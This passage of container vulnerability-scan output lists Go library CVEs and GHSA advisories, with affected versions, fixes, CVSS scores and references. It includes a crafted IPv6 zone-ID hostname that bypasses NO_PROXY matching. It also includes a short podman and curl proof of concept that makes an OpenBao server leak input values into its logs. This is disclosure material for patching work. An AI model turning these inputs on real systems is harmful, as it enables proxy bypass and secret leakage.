│                       │     │                  ╰ DiffID: sha256:013f8762bd2ffae4f3afb3877069fccdd92c14e304b34
│                       │     │                            b5167a289ac82c12925 
│                       │     ├ SeveritySource  : ghsa 
│                       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-22870 
│                       │     ├ DataSource       ╭ ID  : ghsa 
│                       │     │                  ├ Name: GitHub Security Advisory Go 
│                       │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
│                       │     │                          osystem%3Ago 
│                       │     ├ Title           : golang.org/x/net/proxy: golang.org/x/net/http/httpproxy: HTTP
│                       │     │                    Proxy bypass using IPv6 Zone IDs in golang.org/x/net 
│                       │     ├ Description     : Matching of hosts against proxy patterns can improperly treat
│                       │     │                    an IPv6 zone ID as a hostname component. For example, when
│                       │     │                   the NO_PROXY environment variable is set to "*.example.com",
│                       │     │                   a request to "[::1%25.example.com]:80` will incorrectly match
│                       │     │                    and not be proxied. 
│                       │     ├ Severity        : MEDIUM 
│                       │     ├ CweIDs           ─ [0]: CWE-115 
│                       │     ├ VendorSeverity   ╭ amazon     : 2 
│                       │     │                  ├ azure      : 2 
│                       │     │                  ├ cbl-mariner: 2 
│                       │     │                  ├ ghsa       : 2 
│                       │     │                  ├ redhat     : 2 
│                       │     │                  ╰ ubuntu     : 2 
│                       │     ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/
│                       │     │                  │        │           A:L 
│                       │     │                  │        ╰ V3Score : 4.4 
│                       │     │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/
│                       │     │                           │           A:L 
│                       │     │                           ╰ V3Score : 4.4 
│                       │     ├ References       ╭ [0] : http://www.openwall.com/lists/oss-security/2025/03/07/2 
│                       │     │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2025-22870 
│                       │     │                  ├ [2] : https://github.com/golang/go/issues/71984 
│                       │     │                  ├ [3] : https://go-review.googlesource.com/q/project:net 
│                       │     │                  ├ [4] : https://go.dev/cl/654697 
│                       │     │                  ├ [5] : https://go.dev/issue/71984 
│                       │     │                  ├ [6] : https://groups.google.com/g/golang-announce/c/4t3lzH3I
│                       │     │                  │       0eI/m/b42ImqrBAQAJ 
│                       │     │                  ├ [7] : https://nvd.nist.gov/vuln/detail/CVE-2025-22870 
│                       │     │                  ├ [8] : https://pkg.go.dev/vuln/GO-2025-3503 
│                       │     │                  ├ [9] : https://security.netapp.com/advisory/ntap-20250509-0007 
│                       │     │                  ├ [10]: https://security.netapp.com/advisory/ntap-20250509-0007/ 
│                       │     │                  ├ [11]: https://ubuntu.com/security/notices/USN-7574-1 
│                       │     │                  ╰ [12]: https://www.cve.org/CVERecord?id=CVE-2025-22870 
│                       │     ├ PublishedDate   : 2025-03-12T19:15:38.31Z 
│                       │     ╰ LastModifiedDate: 2025-05-09T20:15:38.727Z 
│                       ╰ [2] ╭ VulnerabilityID : CVE-2025-22872 
│                             ├ PkgID           : golang.org/x/net@v0.28.0 
│                             ├ PkgName         : golang.org/x/net 
│                             ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.28.0 
│                             │                  ╰ UID : 2fe24708cb92b4b0 
│                             ├ InstalledVersion: v0.28.0 
│                             ├ FixedVersion    : 0.38.0 
│                             ├ Status          : fixed 
│                             ├ Layer            ╭ Digest: sha256:c0959bad9720892bf785e51d3e640bea317084dc7279a
│                             │                  │         9a2e862e2b8cf782174 
│                             │                  ╰ DiffID: sha256:013f8762bd2ffae4f3afb3877069fccdd92c14e304b34
│                             │                            b5167a289ac82c12925 
│                             ├ SeveritySource  : ghsa 
│                             ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-22872 
│                             ├ DataSource       ╭ ID  : ghsa 
│                             │                  ├ Name: GitHub Security Advisory Go 
│                             │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
│                             │                          osystem%3Ago 
│                             ├ Title           : golang.org/x/net/html: Incorrect Neutralization of Input
│                             │                   During Web Page Generation in x/net in golang.org/x/net 
│                             ├ Description     : The tokenizer incorrectly interprets tags with unquoted
│                             │                   attribute values that end with a solidus character (/) as
│                             │                   self-closing. When directly using Tokenizer, this can result
│                             │                   in such tags incorrectly being marked as self-closing, and
│                             │                   when using the Parse functions, this can result in content
│                             │                   following such tags as being placed in the wrong scope during
│                             │                    DOM construction, but only when tags are in foreign content
│                             │                   (e.g. <math>, <svg>, etc contexts). 
│                             ├ Severity        : MEDIUM 
│                             ├ VendorSeverity   ╭ amazon     : 3 
│                             │                  ├ azure      : 2 
│                             │                  ├ cbl-mariner: 2 
│                             │                  ├ ghsa       : 2 
│                             │                  ╰ redhat     : 2 
│                             ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:L/
│                             │                           │           A:L 
│                             │                           ╰ V3Score : 6.5 
│                             ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2025-22872 
│                             │                  ├ [1]: https://github.com/advisories/GHSA-vvgc-356p-c3xw 
│                             │                  ├ [2]: https://go.dev/cl/662715 
│                             │                  ├ [3]: https://go.dev/issue/73070 
│                             │                  ├ [4]: https://groups.google.com/g/golang-announce/c/ezSKR9vqbqA 
│                             │                  ├ [5]: https://nvd.nist.gov/vuln/detail/CVE-2025-22872 
│                             │                  ├ [6]: https://pkg.go.dev/vuln/GO-2025-3595 
│                             │                  ├ [7]: https://security.netapp.com/advisory/ntap-20250516-0007 
│                             │                  ├ [8]: https://security.netapp.com/advisory/ntap-20250516-0007/ 
│                             │                  ╰ [9]: https://www.cve.org/CVERecord?id=CVE-2025-22872 
│                             ├ PublishedDate   : 2025-04-16T18:16:04.183Z 
│                             ╰ LastModifiedDate: 2025-05-16T23:15:19.707Z 
├ [5] ╭ Target: usr/bin/docker 
│     ├ Class : lang-pkgs 
│     ╰ Type  : gobinary 
├ [6] ╭ Target: usr/bin/helm 
│     ├ Class : lang-pkgs 
│     ╰ Type  : gobinary 
├ [7] ╭ Target         : usr/bin/nerdctl 
│     ├ Class          : lang-pkgs 
│     ├ Type           : gobinary 
│     ╰ Vulnerabilities ╭ [0] ╭ VulnerabilityID : CVE-2025-54388 
│                       │     ├ PkgID           : github.com/docker/docker@v28.3.1+incompatible 
│                       │     ├ PkgName         : github.com/docker/docker 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/docker/docker@v28.3.1%2Bincompat
│                       │     │                  │       ible 
│                       │     │                  ╰ UID : f87f4b258c265c38 
│                       │     ├ InstalledVersion: v28.3.1+incompatible 
│                       │     ├ FixedVersion    : 28.3.3 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:c0959bad9720892bf785e51d3e640bea317084dc7279a
│                       │     │                  │         9a2e862e2b8cf782174 
│                       │     │                  ╰ DiffID: sha256:013f8762bd2ffae4f3afb3877069fccdd92c14e304b34
│                       │     │                            b5167a289ac82c12925 
│                       │     ├ SeveritySource  : ghsa 
│                       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-54388 
│                       │     ├ DataSource       ╭ ID  : ghsa 
│                       │     │                  ├ Name: GitHub Security Advisory Go 
│                       │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
│                       │     │                          osystem%3Ago 
│                       │     ├ Title           : github.com/moby/moby: Moby's Firewalld reload makes container
│                       │     │                    ports accessible 
│                       │     ├ Description     : Moby is an open source container framework developed by
│                       │     │                   Docker Inc. that is distributed as Docker Engine, Mirantis
│                       │     │                   Container Runtime, and various other downstream
│                       │     │                   projects/products. In versions 28.2.0 through 28.3.2, when
│                       │     │                   the firewalld service is reloaded it removes all iptables
│                       │     │                   rules including those created by Docker. While Docker should
│                       │     │                   automatically recreate these rules, versions before 28.3.3
│                       │     │                   fail to recreate the specific rules that block external
│                       │     │                   access to containers. This means that after a firewalld
│                       │     │                   reload, containers with ports published to localhost (like
│                       │     │                   127.0.0.1:8080) become accessible from remote machines that
│                       │     │                   have network routing to the Docker bridge, even though they
│                       │     │                   should only be accessible from the host itself. The
│                       │     │                   vulnerability only affects explicitly published ports -
│                       │     │                   unpublished ports remain protected. This issue is fixed in
│                       │     │                   version 28.3.3. 
│                       │     ├ Severity        : MEDIUM 
│                       │     ├ CweIDs           ─ [0]: CWE-909 
│                       │     ├ VendorSeverity   ╭ ghsa  : 2 
│                       │     │                  ╰ redhat: 2 
│                       │     ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:A/AC:L/PR:N/UI:R/S:C/C:L/I:L/
│                       │     │                           │           A:N 
│                       │     │                           ╰ V3Score : 5.2 
│                       │     ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2025-54388 
│                       │     │                  ├ [1]: https://github.com/moby/moby 
│                       │     │                  ├ [2]: https://github.com/moby/moby/commit/bea959c7b793b32a893
│                       │     │                  │      820b97c4eadc7c87fabb0 
│                       │     │                  ├ [3]: https://github.com/moby/moby/pull/50506 
│                       │     │                  ├ [4]: https://github.com/moby/moby/security/advisories/GHSA-x
│                       │     │                  │      4rx-4gw3-53p4 
│                       │     │                  ├ [5]: https://nvd.nist.gov/vuln/detail/CVE-2025-54388 
│                       │     │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2025-54388 
│                       │     ├ PublishedDate   : 2025-07-30T14:15:28.693Z 
│                       │     ╰ LastModifiedDate: 2025-07-31T18:42:37.87Z 
│                       ├ [1] ╭ VulnerabilityID : GHSA-2464-8j7c-4cjm 
│                       │     ├ PkgID           : github.com/go-viper/mapstructure/v2@v2.3.0 
│                       │     ├ PkgName         : github.com/go-viper/mapstructure/v2 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/go-viper/mapstructure/v2@v2.3.0 
│                       │     │                  ╰ UID : 7c3062713bb034b5 
│                       │     ├ InstalledVersion: v2.3.0 
│                       │     ├ FixedVersion    : 2.4.0 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:c0959bad9720892bf785e51d3e640bea317084dc7279a
│                       │     │                  │         9a2e862e2b8cf782174 
│                       │     │                  ╰ DiffID: sha256:013f8762bd2ffae4f3afb3877069fccdd92c14e304b34
│                       │     │                            b5167a289ac82c12925 
│                       │     ├ SeveritySource  : ghsa 
│                       │     ├ PrimaryURL      : https://github.com/advisories/GHSA-2464-8j7c-4cjm 
│                       │     ├ DataSource       ╭ ID  : ghsa 
│                       │     │                  ├ Name: GitHub Security Advisory Go 
│                       │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
│                       │     │                          osystem%3Ago 
│                       │     ├ Title           : go-viper's mapstructure May Leak Sensitive Information in
│                       │     │                   Logs When Processing Malformed Data 
│                       │     ├ Description     : ### Summary
│                       │     │                   
│                       │     │                   Use of this library in a security-critical context may result
│                       │     │                    in leaking sensitive information, if used to process
│                       │     │                   sensitive fields.
│                       │     │                   ### Details
│                       │     │                   OpenBao (and presumably HashiCorp Vault) have surfaced error
│                       │     │                   messages from `mapstructure` as follows:
│                       │     │                   https://github.com/openbao/openbao/blob/98c3a59c040efca724353
│                       │     │                   ca46ca79bd5cdbab920/sdk/framework/field_data.go#L43-L50
│                       │     │                   ```go
│                       │     │                   			_, _, err := d.getPrimitive(field, schema)
│                       │     │                   			if err != nil {
│                       │     │                   				return fmt.Errorf("error converting input for field %q:
│                       │     │                   %w", field, err)
│                       │     │                   			}
│                       │     │                   ```
│                       │     │                   where this calls `mapstructure.WeakDecode(...)`:
│                       │     │                   ca46ca79bd5cdbab920/sdk/framework/field_data.go#L181-L193
│                       │     │                   func (d *FieldData) getPrimitive(k string, schema
│                       │     │                   *FieldSchema) (interface{}, bool, error) {
│                       │     │                   	raw, ok := d.Raw[k]
│                       │     │                   	if !ok {
│                       │     │                   		return nil, false, nil
│                       │     │                   	}
│                       │     │                   	switch t := schema.Type; t {
│                       │     │                   	case TypeBool:
│                       │     │                   		var result bool
│                       │     │                   		if err := mapstructure.WeakDecode(raw, &result); err != nil
│                       │     │                    {
│                       │     │                   			return nil, false, err
│                       │     │                   		}
│                       │     │                   		return result, true, nil
│                       │     │                   Notably, `WeakDecode(...)` eventually calls one of the decode
│                       │     │                    helpers, which surfaces the original value via `strconv`
│                       │     │                   helpers:
│                       │     │                   https://github.com/go-viper/mapstructure/blob/8c61ec1924fcfa5
│                       │     │                   22f9fc6b4618c672db61d1a38/mapstructure.go#L720-L727
│                       │     │                   22f9fc6b4618c672db61d1a38/mapstructure.go#L791-L798
│                       │     │                   22f9fc6b4618c672db61d1a38/decode_hooks.go#L180
│                       │     │                   & more. These are different code paths than are fixed in the
│                       │     │                   previous iteration at
│                       │     │                   https://github.com/go-viper/mapstructure/security/advisories/
│                       │     │                   GHSA-fv92-fjc5-jj9h.
│                       │     │                   ### PoC
│                       │     │                   To reproduce with OpenBao:
│                       │     │                   $ podman run --pull=always -p 8300:8300
│                       │     │                   openbao/openbao:latest server -dev -dev-root-token-id=root
│                       │     │                   -dev-listen-address=0.0.0.0:8300
│                       │     │                   and in a new tab:
│                       │     │                   $ BAO_TOKEN=root BAO_ADDR=http://localhost:8300 bao auth
│                       │     │                   enable userpass
│                       │     │                   Success! Enabled userpass auth method at: userpass/
│                       │     │                   $ curl -X PUT -H "X-Vault-Request: true" -H "X-Vault-Token:
│                       │     │                   root" -d '{"ttl":"asdf"}'
│                       │     │                   "http://localhost:8200/v1/auth/userpass/users/asdf"
│                       │     │                   --> server logs:
│                       │     │                   2025-06-25T21:32:25.101-0500 [ERROR] core: failed to run
│                       │     │                   existence check: error="error converting input for field
│                       │     │                   \"ttl\": time: invalid duration \"asdf\""
│                       │     │                   ### Impact
│                       │     │                   This is an information disclosure bug with little mitigation.
│                       │     │                    See
│                       │     │                   https://discuss.hashicorp.com/t/hcsec-2025-09-vault-may-expos
│                       │     │                   e-sensitive-information-in-error-logs-when-processing-malform
│                       │     │                   ed-data-with-the-kv-v2-plugin/74717 for a previous version.
│                       │     │                   That version was fixed, but this is in the second part of
│                       │     │                   that error message (starting at `'' expected a map, got
│                       │     │                   'string'` -- when the field type is `string` and a `map` is
│                       │     │                   provided, we see the above information leak -- the previous
│                       │     │                   example had a `map` type field with a `string` value
│                       │     │                   provided).
│                       │     │                   This was rated 4.5 Medium by HashiCorp in the past
│                       │     │                   iteration. 
│                       │     ├ Severity        : MEDIUM 
│                       │     ├ VendorSeverity   ─ ghsa: 2 
│                       │     ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N 
│                       │     │                         ╰ V3Score : 5.3 
│                       │     ├ References       ╭ [0]: https://github.com/go-viper/mapstructure 
│                       │     │                  ├ [1]: https://github.com/go-viper/mapstructure/commit/742921c
│                       │     │                  │      9ba2854d27baa64272487fc5075d2c39c 
│                       │     │                  ├ [2]: https://github.com/go-viper/mapstructure/security/advis
│                       │     │                  │      ories/GHSA-2464-8j7c-4cjm 
│                       │     │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2025-3900 
│                       │     ├ PublishedDate   : 2025-08-21T14:37:19Z 
│                       │     ╰ LastModifiedDate: 2025-08-29T20:44:25Z 
│                       ╰ [2] ╭ VulnerabilityID : CVE-2025-47907 
│                             ├ PkgID           : stdlib@v1.24.4 
│                             ├ PkgName         : stdlib 
│                             ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.4 
│                             │                  ╰ UID : e23adfee605e8287 
│                             ├ InstalledVersion: v1.24.4 
│                             ├ FixedVersion    : 1.23.12, 1.24.6 
│                             ├ Status          : fixed 
│                             ├ Layer            ╭ Digest: sha256:c0959bad9720892bf785e51d3e640bea317084dc7279a
│                             │                  │         9a2e862e2b8cf782174 
│                             │                  ╰ DiffID: sha256:013f8762bd2ffae4f3afb3877069fccdd92c14e304b34
│                             │                            b5167a289ac82c12925 
│                             ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-47907 
│                             ├ DataSource       ╭ ID  : govulndb 
│                             │                  ├ Name: The Go Vulnerability Database 
│                             │                  ╰ URL : https://pkg.go.dev/vuln/ 
│                             ├ Title           : database/sql: Postgres Scan Race Condition 
│                             ├ Description     : Cancelling a query (e.g. by cancelling the context passed to
│                             │                   one of the query methods) during a call to the Scan method of
│                             │                    the returned Rows can result in unexpected results if other
│                             │                   queries are being made in parallel. This can result in a race
│                             │                    condition that may overwrite the expected results with those
│                             │                    of another query, causing the call to Scan to return either
│                             │                   unexpected results from the other query or an error. 
│                             ├ Severity        : HIGH 
│                             ├ VendorSeverity   ╭ azure  : 3 
│                             │                  ├ bitnami: 3 
│                             │                  ╰ redhat : 3 
│                             ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L
│                             │                  │         │           /A:L 
│                             │                  │         ╰ V3Score : 7 
│                             │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L
│                             │                            │           /A:L 
│                             │                            ╰ V3Score : 7 
│                             ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2025-47907 
│                             │                  ├ [1]: https://go.dev/cl/693735 
│                             │                  ├ [2]: https://go.dev/issue/74831 
│                             │                  ├ [3]: https://groups.google.com/g/golang-announce/c/x5MKroML2yM 
│                             │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2025-47907 
│                             │                  ├ [5]: https://pkg.go.dev/vuln/GO-2025-3849 
│                             │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2025-47907 
│                             ├ PublishedDate   : 2025-08-07T16:15:30.357Z 
│                             ╰ LastModifiedDate: 2025-08-07T21:26:37.453Z 
├ [8] ╭ Target         : usr/bin/skopeo 
│     ├ Class          : lang-pkgs 
│     ├ Type           : gobinary 
│     ╰ Vulnerabilities ─ [0] ╭ VulnerabilityID : CVE-2025-58058 
│                             ├ PkgID           : github.com/ulikunitz/xz@v0.5.12 
│                             ├ PkgName         : github.com/ulikunitz/xz 
│                             ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/ulikunitz/xz@v0.5.12 
│                             │                  ╰ UID : 9c51b87b941526f4 
│                             ├ InstalledVersion: v0.5.12 
│                             ├ FixedVersion    : 0.5.15 
│                             ├ Status          : fixed 
│                             ├ Layer            ╭ Digest: sha256:c0959bad9720892bf785e51d3e640bea317084dc7279a
│                             │                  │         9a2e862e2b8cf782174 
│                             │                  ╰ DiffID: sha256:013f8762bd2ffae4f3afb3877069fccdd92c14e304b34
│                             │                            b5167a289ac82c12925 
│                             ├ SeveritySource  : ghsa 
│                             ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-58058 
│                             ├ DataSource       ╭ ID  : ghsa 
│                             │                  ├ Name: GitHub Security Advisory Go 
│                             │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
│                             │                          osystem%3Ago 
│                             ├ Title           : github.com/ulikunitz/xz: github.com/ulikunitz/xz leaks memory 
│                             ├ Description     : xz is a pure golang package for reading and writing
│                             │                   xz-compressed files. Prior to version 0.5.14, it is possible
│                             │                   to put data in front of an LZMA-encoded byte stream without
│                             │                   detecting the situation while reading the header. This can
│                             │                   lead to increased memory consumption because the current
│                             │                   implementation allocates the full decoding buffer directly
│                             │                   after reading the header. The LZMA header doesn't include a
│                             │                   magic number or has a checksum to detect such an issue
│                             │                   according to the specification. Note that the code recognizes
│                             │                    the issue later while reading the stream, but at this time
│                             │                   the memory allocation has already been done. This issue has
│                             │                   been patched in version 0.5.14. 
│                             ├ Severity        : MEDIUM 
│                             ├ CweIDs           ─ [0]: CWE-770 
│                             ├ VendorSeverity   ╭ ghsa  : 2 
│                             │                  ╰ redhat: 2 
│                             ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/
│                             │                  │        │           A:L 
│                             │                  │        ╰ V3Score : 5.3 
│                             │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/
│                             │                           │           A:L 
│                             │                           ╰ V3Score : 5.3 
│                             ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2025-58058 
│                             │                  ├ [1]: https://github.com/ulikunitz/xz 
│                             │                  ├ [2]: https://github.com/ulikunitz/xz/commit/88ddf1d0d98d688d
│                             │                  │      b65de034f48960b2760d2ae2 
│                             │                  ├ [3]: https://github.com/ulikunitz/xz/security/advisories/GHS
│                             │                  │      A-jc7w-c686-c4v9 
│                             │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2025-58058 
│                             │                  ╰ [5]: https://www.cve.org/CVERecord?id=CVE-2025-58058 
│                             ├ PublishedDate   : 2025-08-28T22:15:32.577Z 
│                             ╰ LastModifiedDate: 2025-08-29T16:24:29.73Z 
╰ [9] ╭ Target         : usr/bin/syft 
      ├ Class          : lang-pkgs 
      ├ Type           : gobinary 
      ╰ Vulnerabilities ─ [0] ╭ VulnerabilityID : CVE-2025-58058 
                              ├ PkgID           : github.com/ulikunitz/xz@v0.5.12 
                              ├ PkgName         : github.com/ulikunitz/xz 
                              ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/ulikunitz/xz@v0.5.12 
                              │                  ╰ UID : dab39ef52e0395fd 
                              ├ InstalledVersion: v0.5.12 
                              ├ FixedVersion    : 0.5.15 
                              ├ Status          : fixed 
                              ├ Layer            ╭ Digest: sha256:c0959bad9720892bf785e51d3e640bea317084dc7279a
                              │                  │         9a2e862e2b8cf782174 
                              │                  ╰ DiffID: sha256:013f8762bd2ffae4f3afb3877069fccdd92c14e304b34
                              │                            b5167a289ac82c12925 
                              ├ SeveritySource  : ghsa 
                              ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-58058 
                              ├ DataSource       ╭ ID  : ghsa 
                              │                  ├ Name: GitHub Security Advisory Go 
                              │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
                              │                          osystem%3Ago 
                              ├ Title           : github.com/ulikunitz/xz: github.com/ulikunitz/xz leaks memory 
                              ├ Description     : xz is a pure golang package for reading and writing
                              │                   xz-compressed files. Prior to version 0.5.14, it is possible
                              │                   to put data in front of an LZMA-encoded byte stream without
                              │                   detecting the situation while reading the header. This can
                              │                   lead to increased memory consumption because the current
                              │                   implementation allocates the full decoding buffer directly
                              │                   after reading the header. The LZMA header doesn't include a
                              │                   magic number or has a checksum to detect such an issue
                              │                   according to the specification. Note that the code recognizes
                              │                    the issue later while reading the stream, but at this time
                              │                   the memory allocation has already been done. This issue has
                              │                   been patched in version 0.5.14. 
                              ├ Severity        : MEDIUM 
                              ├ CweIDs           ─ [0]: CWE-770 
                              ├ VendorSeverity   ╭ ghsa  : 2 
                              │                  ╰ redhat: 2 
                              ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/
                              │                  │        │           A:L 
                              │                  │        ╰ V3Score : 5.3 
                              │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/
                              │                           │           A:L 
                              │                           ╰ V3Score : 5.3 
                              ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2025-58058 
                              │                  ├ [1]: https://github.com/ulikunitz/xz 
                              │                  ├ [2]: https://github.com/ulikunitz/xz/commit/88ddf1d0d98d688d
                              │                  │      b65de034f48960b2760d2ae2 
                              │                  ├ [3]: https://github.com/ulikunitz/xz/security/advisories/GHS
                              │                  │      A-jc7w-c686-c4v9 
                              │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2025-58058 
                              │                  ╰ [5]: https://www.cve.org/CVERecord?id=CVE-2025-58058 
                              ├ PublishedDate   : 2025-08-28T22:15:32.577Z 
                              ╰ LastModifiedDate: 2025-08-29T16:24:29.73Z 
````
